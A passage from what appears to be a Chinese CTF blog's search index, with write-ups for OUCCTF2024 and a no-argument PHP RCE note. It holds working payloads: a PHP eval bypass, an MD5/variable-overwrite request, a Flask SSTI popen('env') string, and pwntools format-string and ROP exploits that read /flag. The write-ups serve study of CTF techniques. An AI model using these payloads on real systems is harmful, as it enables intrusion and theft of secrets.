class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print_r(scandir(current(localeconv())));列出当前目录下的文件<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( <span class="selector-attr">[0]</span> =&gt; . <span class="selector-attr">[1]</span> =&gt; .. <span class="selector-attr">[2]</span> =&gt; flag<span class="selector-class">.php</span> <span class="selector-attr">[3]</span> =&gt; index<span class="selector-class">.php</span> )</span><br></pre></td></tr></table></figure><br>flag.php位于第三位，我们可以先reverse后用next带出上一个文件<br>print_r(next(array_reverse(scandir(current(localeconv())))));<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br></pre></td></tr></table></figure><br>直接读flag<br>highlight_file(next(array_reverse(scandir(current(localeconv())))));</p><blockquote><p>使用highlight_file,show_source函数前端回显，可直接看到flag<br>使用readfile,file_get_contents等函数前端不回显，需查看源码</p></blockquote><p>参考文章<br><a href="https://arsenetang.github.io/2021/09/26/RCE篇之无参数rce" title="RCE篇之无参数rce">RCE篇之无参数rce</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九届中国海洋大学信息安全竞赛</title>
      <link href="/posts/OUCCTF2024.html"/>
      <url>/posts/OUCCTF2024.html</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="一眼盯帧"><a href="#一眼盯帧" class="headerlink" title="一眼盯帧"></a>一眼盯帧</h3><p>拿到的 mp4 视频使用脚本提取每一帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开视频文件</span></span><br><span class="line">video_capture = cv2.VideoCapture(<span class="string">&#x27;C:/Users/Nanian233/Desktop/aa/a.mp4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取视频的帧率</span></span><br><span class="line">fps = <span class="built_in">int</span>(video_capture.get(cv2.CAP_PROP_FPS))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化帧计数器</span></span><br><span class="line">frame_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 逐帧读取视频</span></span><br><span class="line">    ret, frame = video_capture.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果视频读取完毕，则退出循环</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存当前帧为图像文件</span></span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;frame_<span class="subst">&#123;frame_count&#125;</span>.jpg&quot;</span>, frame)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 增加帧计数器</span></span><br><span class="line">    frame_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放资源</span></span><br><span class="line">video_capture.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><p>然后把题目的 jpg 每一张手工提取成 txt（ex</p><p>直接用 z3 求解器求解多元线性方程即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a1,.....,a31= Ints(<span class="string">&#x27;a1 a22 .... a31&#x27;</span>)</span><br><span class="line">x = Solver()</span><br><span class="line"><span class="comment">#x.add(23*a1+40*a2+5*a3+76*a4+15*a5+39*a6+5*a7+.....*a31==135144)</span></span><br><span class="line"><span class="keyword">if</span> x.check()==sat:</span><br><span class="line">    model = x.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br></pre></td></tr></table></figure><p>解转 ascii 字符得到 flag</p><h3 id="帕鲁服务器-1"><a href="#帕鲁服务器-1" class="headerlink" title="帕鲁服务器#1"></a>帕鲁服务器#1</h3><p>拿到的 vmdk 文件挂载到虚拟机后使用 wireshark 检测流量即可得到</p><p><img src="https://s2.loli.net/2024/05/05/icdhPY3OzqVRpjm.png" alt=""></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O.U.C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>,<span class="variable">$query</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;听说你是黑客&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;你知道b等于什么能绕过这个弱类型吗（〃｀ 3′〃）&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;&amp;<span class="variable">$a</span>!=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;哎呦，不错喔&quot;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$O_U_C</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;O_U_C&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$O_U_C</span>)&amp;&amp;<span class="variable">$O_U_C</span>!==<span class="string">&#x27;100&#x27;</span>&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^100$/&#x27;</span>,<span class="variable">$O_U_C</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;but&#x27;</span>.<span class="string">&#x27;如果我寄出===阁下又该如何应对๑乛◡乛๑&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;好，那么好&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;md5&quot;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;还是被你解出来了&#x27;</span>.<span class="string">&#x27; ྀི ྀིɞ ྀི ིྀ ིྀ&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;告诉你secret的md5值也无妨，反正哈希是不可逆的๑乛◡乛๑，除非你能箨斩攻击我&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="string">&#x27;ouc&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;不过如此&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行嘛(´ｪ｀)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;嗨害嗨  (๑ᵒ̴̶̷͈᷄ᗨᵒ̴̶̷͈᷅)&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/zzjdbk/p/12985530.html">php 变量覆盖</a></p><p><a href="https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">preg_match()绕过</a></p><p><a href="https://segmentfault.com/a/1190000039189857">md5 强弱类型比较</a></p><p><a href="https://github.com/shellfeel/hash-ext-attack/tree/master">hash 拓展攻击脚本</a>（实际没有用到,怎么出题的 0.0）</p><p><strong>?a=QLTHNDT&amp;b=PJNPDWY&amp;O%20U%20C=100%0a&amp;md5=ouc</strong></p><p><strong>POST:md51[]=1&amp;md52[]=2</strong></p><p><strong>cookie:md5=06d92f344c7d8c89cb164353ca0fa070</strong></p><h3 id="菜狗工具-1"><a href="#菜狗工具-1" class="headerlink" title="菜狗工具#1"></a>菜狗工具#1</h3><p><a href="https://xz.aliyun.com/t/3679?time__1311=n4%2BxnD0DBDgDc7D9DUO4BqOoT47KaW4WemD#toc-8">flask 之 ssti 模版注入从零到入门 - 先知社区</a></p><p>payload：</p><p>找到 132 可用，global 找环境变量找到 flag</p><p><code>print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;env&#39;).read())</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="padded-fmt"><a href="#padded-fmt" class="headerlink" title="padded-fmt"></a>padded-fmt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./padfmt&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./padfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;competition.blue-whale.me&#x27;,20132)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%x%x%x%x%x%x%pAAAA&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;AAAA&#x27;</span>).rstrip(<span class="string">b&#x27;A&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">flag = stack + <span class="number">0x470</span> </span><br><span class="line">p.sendline(<span class="string">b&#x27;%x%x%x%x%x%x%x%x%x%x%x%x%x%sAAAA&#x27;</span>+p64(flag))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p>经典栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_stack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./baby_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;competition.blue-whale.me&#x27;,20135)</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x140</span>) </span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x150</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">pop_rdi = <span class="number">0x400b93</span></span><br><span class="line">leave = <span class="number">0x400a74</span></span><br><span class="line"></span><br><span class="line">exp = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;func&#x27;</span>])</span><br><span class="line">exp =exp.ljust(<span class="number">0x140</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(stack-<span class="number">8</span>)+p64(leave)</span><br><span class="line"></span><br><span class="line">p.send(exp)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;again:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment">#泄露出栈地址</span></span><br><span class="line">libc_addr = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">new_stack = stack-<span class="number">0x128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(new_stack))</span><br><span class="line"></span><br><span class="line">oopen = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">syscall = libc_addr + <span class="number">0x26bf</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x202f8</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line">exp = p64(pop_rdi)+p64(new_stack+<span class="number">0xac</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(oopen)</span><br><span class="line">exp += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x601100</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read)</span><br><span class="line">exp += p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(<span class="number">0x601100</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(write)</span><br><span class="line">exp += p32(<span class="number">0</span>) +  <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line">exp = exp.ljust(<span class="number">0x140</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">exp += p64(new_stack-<span class="number">8</span>)</span><br><span class="line">exp += p64(leave)</span><br><span class="line"></span><br><span class="line">p.send(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="摩登-Pwn"><a href="#摩登-Pwn" class="headerlink" title="摩登 Pwn"></a>摩登 Pwn</h3><p>tigervnc 连上去，输入非法值就可以获得 flag</p><p><img src="https://s2.loli.net/2024/05/05/RQxP4KoGrmElwki.png" alt=""></p><p><img src="https://s2.loli.net/2024/05/05/n1tYT4V9JOQl8Gx.png" alt=""></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="xor"><a href="#xor" class="headerlink" title="xor++:"></a>xor++:</h3><p>没啥好说，直接梭就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = [ </span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;%&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;(&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;$&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;!&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;&lt;&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;*&quot;</span>),<span class="built_in">ord</span>(<span class="string">&quot;&lt;&quot;</span>),</span><br><span class="line">    <span class="number">30</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">4</span>, <span class="number">63</span>, <span class="number">53</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">38</span>, <span class="number">14</span>, <span class="number">26</span></span><br><span class="line">   </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">v8=<span class="number">67</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    char=i^v8</span><br><span class="line">    v8+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="钩子："><a href="#钩子：" class="headerlink" title="钩子："></a>钩子：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 给定的byte_7FF7BAB41410数据</span></span><br><span class="line">byte_7FF7BAB41410 = <span class="built_in">bytes</span>([<span class="number">0x88</span>, <span class="number">0xE3</span>, <span class="number">0xEE</span>, <span class="number">0x11</span>, <span class="number">0xC6</span>, <span class="number">0x49</span>, <span class="number">0x74</span>, <span class="number">0xA5</span>, <span class="number">0xDD</span>, <span class="number">0x98</span>,</span><br><span class="line">                           <span class="number">0x59</span>, <span class="number">0xE9</span>, <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0x6E</span>, <span class="number">0xBF</span>, <span class="number">0x3A</span>, <span class="number">0xB3</span>, <span class="number">0x9B</span>, <span class="number">0xDF</span>,</span><br><span class="line">                           <span class="number">0x10</span>, <span class="number">0x42</span>, <span class="number">0xFF</span>, <span class="number">0x99</span>, <span class="number">0x6C</span>, <span class="number">0xE3</span>, <span class="number">0x3E</span>, <span class="number">0x05</span>, <span class="number">0x2C</span>, <span class="number">0x65</span>,</span><br><span class="line">                           <span class="number">0x47</span>, <span class="number">0xEF</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化v10为0到255的字节序列</span></span><br><span class="line">v10 = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v10[i]=i</span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行循环操作</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="comment"># 注意：这里直接使用j % 32，因为0x20ui64等于32</span></span><br><span class="line">    v9 = (byte_7FF7BAB41410[j % <span class="number">32</span>] + v10[j] + v9) % <span class="number">256</span></span><br><span class="line">    v10[j],v10[v9]=v10[v9],v10[j] <span class="comment"># 交换v10[j]和v10[v9]</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">26</span>  <span class="comment"># 给定的循环次数</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v3 = a1 == <span class="number">26</span>  </span><br><span class="line">data=[ <span class="number">0x02</span>, <span class="number">0xCC</span>, <span class="number">0x47</span>, <span class="number">0xB3</span>, <span class="number">0x4D</span>, <span class="number">0x6C</span>, <span class="number">0xFD</span>, <span class="number">0x9A</span>, <span class="number">0x4C</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0xD4</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x81</span>, <span class="number">0x19</span>, <span class="number">0x0A</span>, <span class="number">0x34</span>, <span class="number">0x26</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xB6</span>, <span class="number">0xB0</span>, <span class="number">0x92</span>, <span class="number">0x49</span>, <span class="number">0xB3</span>]</span><br><span class="line"><span class="comment"># 执行循环操作</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(a1):</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>  <span class="comment"># 更新v6的值</span></span><br><span class="line">    v8 = ((v10[v6] + v8) % <span class="number">256</span>)  <span class="comment"># 计算新的v8值</span></span><br><span class="line">    v10[v6],v10[v8]=v10[v8],v10[v6] <span class="comment"># 交换v10[v6]和v10[v8]</span></span><br><span class="line">    char=v10[(v10[v8]+v10[v6])%<span class="number">256</span>]^data[k]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Base64-rot13"><a href="#Base64-rot13" class="headerlink" title="Base64*rot13:"></a>Base64*rot13:</h3><p>Cyberchef 选择 base64 解密并选择 rot13 模式</p><p><img src="https://s2.loli.net/2024/05/05/3gEBTG9jcKeQAl6.png" alt=""></p><h3 id="NeXT-RSA"><a href="#NeXT-RSA" class="headerlink" title="NeXT RSA"></a>NeXT RSA</h3><p><img src="https://s2.loli.net/2024/05/05/OBaugv76Qs8TYRF.png" alt=""></p><h3 id="模！"><a href="#模！" class="headerlink" title="模！"></a>模！</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mooooo</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res &lt;&lt;= <span class="number">8</span></span><br><span class="line">        res += ( factorial(<span class="built_in">ord</span>(i)) % <span class="number">233</span> )</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span>(reduce(<span class="keyword">lambda</span> p,i:(i <span class="keyword">in</span> table)*p, flag, <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mooooo(flag))</span><br><span class="line"><span class="comment"># output: 2508450541438803643416583335895451914701844680466330955847</span></span><br></pre></td></tr></table></figure><p>加密过程就是把先向左移动 8 位（类似于乘 2 的 8 次方），再加上每个字符的 ASCII 编码的阶乘模 233</p><p>因为已经给出了 flag 的字符范围，所以解密就是先把每个字符的 ASCII 编码的阶乘模 233 的结果求出来做成词典，把解密后得到的结果 output 模上 1&lt;&lt;8 得到的就是加上的字符 ASCII 编码的阶乘模 233 的结果，让它替换成词典中字符即可，然后把得到的 flag 反向输出就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line">table = <span 